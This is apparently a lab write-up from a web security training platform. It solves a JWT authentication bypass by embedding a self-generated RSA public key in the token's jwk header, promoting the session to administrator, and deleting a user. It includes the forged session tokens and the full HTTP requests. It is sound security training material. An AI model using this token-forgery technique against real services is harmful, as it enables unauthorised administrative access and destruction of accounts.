## JWT authentication bypass via jwk header injection

This lab uses a JWT-based mechanism for handling sessions. The server supports the jwk parameter in the JWT header. This is sometimes used to embed the correct verification key directly in the token. However, it fails to check whether the provided key came from a trusted source.

To solve the lab, modify and sign a JWT that gives you access to the admin panel at /admin, then delete the user carlos.

You can log in to your own account using the following credentials: wiener:peter

Tip : 

We recommend familiarizing yourself with how to work with JWTs in Burp Suite before attempting this lab.

## Notes

- /admin
- Search page Found
- Possibility to leave a comment on a post

## Resume

1. Log in as your own user.
2. Send the post-login `GET /my-account` request to Burp Repeater.
3. Confirm that `/admin` is only accessible as `administrator`.
4. Generate a new RSA key pair in the JWT Editor.
5. Change the JWT payload so `sub` becomes `administrator`.
6. Use **Attack** → **Embedded JWK** to inject your public key.
7. Send the forged request to access the admin panel.
8. Delete `carlos`.

## Solve

In Burp, load the JWT Editor extension from the BApp store.

In the lab, log in to your own account and send the post-login `GET /my-account` request to Burp Repeater.

The initial request was:

```http
GET /my-account?id=wiener HTTP/2
Host: 0af3004903da555580a0a323005900dd.web-security-academy.net
Cookie: session=eyJraWQiOiJmYjA4NGVlMC1mZjc4LTRhYWEtYTk5Ni03N2Y2ZjE5NTViYzciLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3OTk1OTAzOCwic3ViIjoid2llbmVyIn0.J4ry0ufylWYEZHR-gEYvWtuq_8pONIh_axCoZUoV94oeG5IylMeyyu0y_FOjCOD9XTS2bw3lZwJ8O-AAQyUZWu2nvGD4pp5Hl_Qg3KvhRQmzwerq7lvVMZimmkLTiPI8mJdmllstSrO0knkm-CQpgA5wTo7If1jzNZrdZcduYbaiRQ_xlxV1i1ti-ETmivdFX792vQLKSMQFiNEzgsCH6OGgqDncFqqlH9bNW658UD54yG_wWHEjyvyGQOwgtwBC-cJYIKaZF7ZqMaHUDC23kFeh0J70qm0yW3NGx7qbCKfg5tTO17j5z19qGrHfyRZGTPh_T0_q7XPzLHQfYFYNVw
```

Then change the path to `/admin` and send the request. The admin panel is only accessible when logged in as `administrator`.

Go to the **JWT Editor Keys** tab in Burp's main tab bar and click **New RSA Key**.

In the dialog, click **Generate** to automatically generate a new key pair, then click **OK** to save the key.

Go back to the `GET /admin` request in Burp Repeater and switch to the extension-generated **JSON Web Token** tab.

In the payload, change the value of the `sub` claim to `administrator`.

At the bottom of the **JSON Web Token** tab, click **Attack**, then select **Embedded JWK**. When prompted, select your newly generated RSA key and click **OK**.

In the header of the JWT, observe that a `jwk` parameter has been added containing your public key.

The modified admin request was:

```http
GET /admin HTTP/2
Host: 0af3004903da555580a0a323005900dd.web-security-academy.net
Cookie: session=eyJraWQiOiI3MDY2YzRiNy04OTJiLTQ1MjMtOTMxYS04NDRjN2FlNzIxZTEiLCJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImp3ayI6eyJrdHkiOiJSU0EiLCJlIjoiQVFBQiIsImtpZCI6IjcwNjZjNGI3LTg5MmItNDUyMy05MzFhLTg0NGM3YWU3MjFlMSIsIm4iOiJuYlVIc2JNU0ZHX3JxNGM5dFNRRnR0cTVuWjZYbHRheklzOHNIZWlEWmhMNFE3UlpYSXA1WGtqWUZ1MDdfdGN3VElWa29heVg5d0trclkwTkpDbTVMM3dzc2VWNl9fXzdjeER0TERIV1RCVGQzYV95ZElyT3VtanFtd2Z6TUtiTHdPNTR3UFozTm1sOTF6aXRxQkJoRWw3MjQ2M0hYWTZ2MnloaU16TGg1bms1Q0h6cWZsR2tQRkFqaVRZV3QyV0lZaWZxQ2RkYUpQdXctU0dhVGJGVmtreDF1WC1hemF1YXJzOTF3QkUyTFFJeHIxRVZkODZoYXNZcV9GZ0VENEFaQ3ZjQklqQjllY3F6ZzV3djY5cXpPUUpsU0NMWG0yVWdYdTFuVlQ5Z0ZORnkwZDhVaEROajFNS2JtSlE1Rl9sYTdiT2VsX0lZQTB5ZGxOa0t1QnJoU3cifX0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3OTk1OTAzOCwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.LT0qz72vmCgdL-k7zuX6XHhy1ewGxkmvNdzNdVdFnCb3isEi1YyFW94OUgY0cyXVEBNlCwji42UCezTYjb_v73XJYZNjt2GExpT89vKm2r2JhDpdXF4oTvmJIUZK-yrTxBatzkGgygez3mjxkVEEaA8oq5LG2CHYmrxHzfY2IZRZFA0yqBS9OaeH0NxjtpZxjLc1283GfRj6eNz_1WFo6y0U4rf1RUJgCBV-bo2KPgR9jVVMIosIRTJ0eSTHBHt7bWiWTppiZxDmombl4Og_DKHwp9Y1s1-BTp8G_4PeZH7q6pEyL6z_j5DHPRTSr78nPhTZjSXj6xm0UsdKmWveMg
```

Send the request. You should now successfully access the admin panel.

The response contains this HTML:

```html
<section>
    <h1>Users</h1>
    <div>
        <span>wiener - </span>
        <a href="/admin/delete?username=wiener">Delete</a>
    </div>
    <div>
        <span>carlos - </span>
        <a href="/admin/delete?username=carlos">Delete</a>
    </div>
</section>
```

Finally, send this request to delete `carlos` and solve the lab:

```http
GET /admin/delete?username=carlos HTTP/2
Host: 0af3004903da555580a0a323005900dd.web-security-academy.net
Cookie: session=eyJraWQiOiI3MDY2YzRiNy04OTJiLTQ1MjMtOTMxYS04NDRjN2FlNzIxZTEiLCJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImp3ayI6eyJrdHkiOiJSU0EiLCJlIjoiQVFBQiIsImtpZCI6IjcwNjZjNGI3LTg5MmItNDUyMy05MzFhLTg0NGM3YWU3MjFlMSIsIm4iOiJuYlVIc2JNU0ZHX3JxNGM5dFNRRnR0cTVuWjZYbHRheklzOHNIZWlEWmhMNFE3UlpYSXA1WGtqWUZ1MDdfdGN3VElWa29heVg5d0trclkwTkpDbTVMM3dzc2VWNl9fXzdjeER0TERIV1RCVGQzYV95ZElyT3VtanFtd2Z6TUtiTHdPNTR3UFozTm1sOTF6aXRxQkJoRWw3MjQ2M0hYWTZ2MnloaU16TGg1bms1Q0h6cWZsR2tQRkFqaVRZV3QyV0lZaWZxQ2RkYUpQdXctU0dhVGJGVmtreDF1WC1hemF1YXJzOTF3QkUyTFFJeHIxRVZkODZoYXNZcV9GZ0VENEFaQ3ZjQklqQjllY3F6ZzV3djY5cXpPUUpsU0NMWG0yVWdYdTFuVlQ5Z0ZORnkwZDhVaEROajFNS2JtSlE1Rl9sYTdiT2VsX0lZQTB5ZGxOa0t1QnJoU3cifX0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3OTk1OTAzOCwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.LT0qz72vmCgdL-k7zuX6XHhy1ewGxkmvNdzNdVdFnCb3isEi1YyFW94OUgY0cyXVEBNlCwji42UCezTYjb_v73XJYZNjt2GExpT89vKm2r2JhDpdXF4oTvmJIUZK-yrTxBatzkGgygez3mjxkVEEaA8oq5LG2CHYmrxHzfY2IZRZFA0yqBS9OaeH0NxjtpZxjLc1283GfRj6eNz_1WFo6y0U4rf1RUJgCBV-bo2KPgR9jVVMIosIRTJ0eSTHBHt7bWiWTppiZxDmombl4Og_DKHwp9Y1s1-BTp8G_4PeZH7q6pEyL6z_j5DHPRTSr78nPhTZjSXj6xm0UsdKmWveMg
```

